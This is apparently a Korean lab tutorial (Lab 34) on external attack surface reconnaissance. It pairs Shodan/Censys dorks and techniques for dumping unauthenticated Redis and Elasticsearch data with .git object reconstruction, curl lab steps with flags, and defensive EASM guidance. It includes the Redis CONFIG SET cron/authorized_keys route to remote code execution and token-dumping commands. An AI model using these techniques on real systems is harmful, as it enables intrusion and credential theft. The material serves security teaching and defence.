# 33-07. Shodan, Censys & Attack Surface Reconnaissance Deepdive: Shadow IT Mapping, Exposed Database Carving & Git Object Reconstruction
# 33-07. Shodan·Censys 기반 외부 공격 표면 정찰(ASM) 심층 분석: 섀도우 IT 매핑, 무인증 데이터베이스 카빙 및 .git 객체 복원

> **핵심 키워드**: External Attack Surface Management (EASM), Shodan Search Filters, Censys Search API, Shadow IT, Unauthenticated Redis/Elasticsearch, Exposed `.git` Directory, Git Object Decompression (`zlib`), Commit History Carving (`git log -p`), AWS Credential Leakage, TruffleHog / Gitleaks Pre-commit Defense.

---

## 1. 개요 및 공격 표면 환경 변화 (Executive Summary & Threat Landscape)

### 1.1 배경 및 문제 정의 (Context & Problem Definition)
현대 엔터프라이즈 환경은 클라우드 네이티브(AWS, GCP, Azure), 멀티 클라우드, 마이크로서비스 및 지속적 배포(CI/CD) 파이프라인의 도입으로 급격히 분산되었습니다. 개발팀과 데이터 엔지니어링팀이 임시 테스트, 스테이징 또는 성능 벤치마킹을 위해 사내 보안팀의 승인 없이 배포한 클라우드 리소스는 즉각 **섀도우 IT (Shadow IT)**가 됩니다.

이러한 리소스는 다음과 같은 치명적인 기본 설정 취약점을 자주 노출합니다:
1. **0.0.0.0 공용 IP 바인딩**: 로컬 개발 환경(`127.0.0.1`) 전제로 설계된 데이터베이스나 캐시 엔진이 퍼블릭 서브넷에 공용 IP를 부여받고 방화벽 룰 없이 인터넷에 노출됨.
2. **무인증 (Unauthenticated) 서비스**: Redis, Elasticsearch, MongoDB 등 기본 설정상 인증이 비활성화되었거나 패스워드가 빈 상태로 실행.
3. **웹 서버 설정 오류로 인한 `.git` 디렉터리 노출**: Nginx, Apache 등 웹 서버의 정적 파일 디렉터리에 프로젝트 전체 또는 `.git` 폴더가 포함되어 누구나 소스 코드 및 버전 관리 객체를 내려받을 수 있음.

```
       [ Global Internet-Wide Scanners ]
             (Shodan, Censys, FOFA)
                        │
                        ▼
   ┌───────────────────────────────────────────────┐
   │ Enterprise External Attack Surface (CIDR/ASN) │
   ├───────────────────────────────────────────────┤
   │ [198.51.100.42:6379]  Redis (No Auth)         │ ──> Session Tokens / JWT Keys
   │ [198.51.100.43:9200]  Elasticsearch (REST)    │ ──> PII & Internal Audit Logs
   │ [198.51.100.44:80]    Nginx Exposed /.git     │ ──> Reconstruct Leaked AWS Keys
   └───────────────────────────────────────────────┘
```

---

## 2. 인터넷 전수 스캐너 동작 원리 및 쿼리 문법 (Scanner Architecture & Syntax)

### 2.1 Shodan vs Censys 스캐닝 메커니즘
- **Shodan**: 비동기식 무상태 스캐너(Stateless Banner Grabber). 전 세계 IPv4 주소의 잘 알려진 수천 개 포트에 주기적으로 TCP SYN 및 프로토콜 핸드셰이크를 시도하고 응답 배너를 수집하여 인덱싱합니다.
- **Censys**: ZMap 및 ZGrab2 프레임워크를 기반으로 프로토콜별 전체 핸드셰이크(TLS 인증서, HTTP 헤더, SSH 키 등)를 수집하여 구조화된 JSON 문서로 제공합니다.

### 2.2 주요 정찰 Dork 패턴

| 목적 | Shodan 쿼리 문법 | Censys 쿼리 문법 |
|------|------------------|------------------|
| 조직 도메인 & ASN 필터링 | `org:"Megacorp Logistics" asn:AS64512` | `autonomous_system.asn: 64512` |
| 무인증 Redis 탐색 | `product:"Redis" port:6379 "redis_version"` | `services.service_name: "REDIS"` |
| 오픈 Elasticsearch 탐색 | `port:9200 "cluster_name" "tagline"` | `services.service_name: "ELASTICSEARCH"` |
| 노출된 Git 디렉터리 | `http.title:"Index of /.git" 200` | `services.http.response.body: "ref: refs/heads"` |

---

## 3. 무인증 데이터베이스 카빙 기법 (Database Carving Deepdive)

### 3.1 Redis 공격 벡터
Redis가 공용 IP에 인증 없이 열려 있을 경우 공격자는 인메모리 키-값 쌍을 전수 추출할 수 있습니다.
- `INFO`: 서버 아키텍처, OS 버전, 실행 사용자, 연결된 클라이언트 및 키베이스 통계 파악.
- `KEYS *`: 전체 캐시 키 목록 획득.
- `GET <key>`: 유효한 JWT 토큰, 사용자 세션, API 비밀키, PII 데이터 획득.
- `CONFIG SET dir /var/spool/cron`: 권한이 높은 경우 크론탭 덮어쓰기 또는 SSH `authorized_keys` 주입을 통한 RCE(원격 코드 실행) 연계.

### 3.2 Elasticsearch 공격 벡터
RESTful API 표준 엔드포인트를 통해 클러스터 메타데이터와 인덱스 문서를 탈취합니다:
- `GET /_cat/indices?v`: 인덱스 명칭, 문서 수(docs.count), 저장 크기 확인.
- `GET /<index>/_search?size=100`: 인덱싱된 로그, 고객 식별 정보, 토큰 데이터를 JSON 형태로 일괄 수집.

---

## 4. 노출된 `.git` 디렉터리와 객체 복원 메커니즘 (Git Object Reconstruction)

### 4.1 Git 저장소 내부 구조
웹 루트에 `.git` 디렉터리가 노출된 경우 디렉터리 리스팅이 꺼져 있더라도 다음 파일들을 순차 요청하여 전체 트리를 복원할 수 있습니다:
1. `/.git/HEAD`: 현재 체크아웃된 브랜치 참조 (`ref: refs/heads/main`).
2. `/.git/refs/heads/main`: 최신 커밋의 40자리 SHA-1 해시 획득.
3. `/.git/objects/<hh>/<hash[2:]>`: zlib 압축된 Git 객체(Commit, Tree, Blob).
4. `/.git/logs/HEAD`: 로컬 리플로그(Reflog)를 통해 과거의 커밋, 브랜치 전환 및 리셋 이력 확인.

```bash
# Python으로 노출된 zlib 압축 Git blob 객체 해제 예시
import zlib
import urllib.request

url = "http://198.51.100.44/.git/objects/8f/3b2a9e1d4c5b6a7e8f90123456789abcdef01"
compressed_blob = urllib.request.urlopen(url).read()
decompressed = zlib.decompress(compressed_blob)
print(decompressed.decode("utf-8", errors="replace"))
```

### 4.2 삭제된 시크릿 커밋 이력 추적 (`git log -p`)
개발자가 실수로 AWS 키나 데이터베이스 비밀번호를 커밋한 후 `git rm` 또는 수정 커밋을 올리더라도, Git은 변경 내역(Diff) 전체를 보관합니다. 공격자는 삭제 커밋 직전의 커밋 개체(Parent Commit)를 복원하여 소멸된 비밀키를 100% 회수합니다.

---

## 5. Lab 34 (OsintHunterLab) 실전 워크스루 (Lab 34 Step-by-Step Walkthrough)

### 5.1 Step 1: Shodan 쿼리를 통한 외부 공격 표면 및 섀도우 IT 탐색
- **목표**: 조직명 및 포트 필터링으로 숨겨진 Redis, Elasticsearch, Git 포털을 식별하고 플래그 획득.
- **요청 PoC**:
  ```bash
  curl -s -X POST http://localhost:8034/api/osint/scan/shodan \
    -H "Content-Type: application/json" \
    -d '{"query": "org:\x27Megacorp\x27 port:6379,9200"}' | jq .
  ```
- **획득 플래그**: `FLAG{OSINT_SHODAN_EXPOSED_SERVICES_RECON_7712}`

### 5.2 Step 2: 무인증 Redis / Elasticsearch 데이터베이스 카빙
- **목표**: `198.51.100.42:6379` 또는 `198.51.100.43:9200`에 접속하여 세션 및 관리자 토큰 덤프.
- **요청 PoC**:
  ```bash
  curl -s -X POST http://localhost:8034/api/osint/leak/database \
    -H "Content-Type: application/json" \
    -d '{"target": "198.51.100.42:6379", "command": "KEYS *"}' | jq .
  ```
- **획득 플래그**: `FLAG{OSINT_ELASTIC_REDIS_UNAUTH_DUMP_PWNED_8823}`

### 5.3 Step 3: 노출된 `.git` 커밋 히스토리 재구성 및 클라우드 키 복원
- **목표**: `198.51.100.44:80/.git`의 커밋 diff를 분석하여 과거 삭제된 프로덕션 AWS 자격증명 추출.
- **요청 PoC**:
  ```bash
  curl -s -X POST http://localhost:8034/api/osint/git/reconstruct \
    -H "Content-Type: application/json" \
    -d '{"target": "198.51.100.44:80/.git", "action": "log"}' | jq .
  ```
- **획득 플래그**: `FLAG{OSINT_GIT_LEAKED_SECRET_RECONSTRUCTED_9934}`

---

## 6. 엔터프라이즈 방어 및 공격 표면 관리(EASM) 전략 (Enterprise Defense & EASM)

1. **외부 공격 표면 관리(EASM) 지속 가동**:
   - 사내 소유 CIDR, 도메인, 클라우드 계정에 대한 Shodan/Censys 모니터링 API 연동.
   - 미승인 포트(6379, 9200, 27017, 3389, 22) 개방 시 즉각 SIEM/SOAR 경보 발생 및 방화벽 차단.
2. **네트워크 격리 및 바인딩 기본 원칙**:
   - 데이터베이스 바인딩 주소를 `0.0.0.0`에서 `127.0.0.1` 또는 프라이빗 VPC 인터페이스로 강제.
   - VPC Security Group에서 인그레스 규칙을 특정 애플리케이션 서브넷으로만 한정.
3. **웹 서버 민감 디렉터리 접근 차단**:
   ```nginx
   # Nginx 설정 예시: .git 등 숨김 파일/폴더 접근 전면 차단
   location ~ /\.(?!well-known).* {
       deny all;
       access_log off;
       log_not_found off;
       return 404;
   }
   ```
4. **CI/CD 시크릿 유출 방지 파이프라인**:
   - 개발자 워크스테이션에 `gitleaks` 또는 `TruffleHog`를 pre-commit hook으로 강제 설치.
   - GitHub Secret Scanning 연동을 통해 커밋 즉시 AWS 키 자동 무효화(Revocation).
